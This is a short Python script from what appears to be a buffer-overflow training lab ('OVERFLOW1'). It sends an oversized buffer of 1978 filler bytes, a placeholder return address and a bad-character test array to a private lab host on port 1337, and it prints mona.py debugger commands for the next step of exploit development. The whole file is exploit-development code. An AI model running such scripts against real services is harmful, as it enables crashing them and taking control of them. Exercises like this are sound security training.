"""
!mona bytearray -b "\x00\x07\x0e"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0198FA30
"""

import socket

ip = "10.10.46.154"
port = 1337

prefix = b"OVERFLOW1 "
offset = 1978
overflow = b"A" * offset
retn = b"BBBB"
padding = b""

bad_chars = {0,0x07,0x2e,0xa0}
payload = b''.join([bytes([i]) for i in range(0,256) if i not in bad_chars])
postfix = b""
print('!mona bytearray -b "{}"\n!mona compare -f C:\\mona\\oscp\\bytearray.bin -a 0198FA30'.format("".join([ "\\x%0.2X" % c for c in bad_chars])))
buffer = prefix + overflow + retn + padding + payload + postfix
print("---")
try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
  s.connect((ip, port))
  # print("Sending evil buffer...")
  s.send(buffer + b"\r\n")
  print("Done!")
except Exception as e:
  print(e)
  print("Could not connect.")
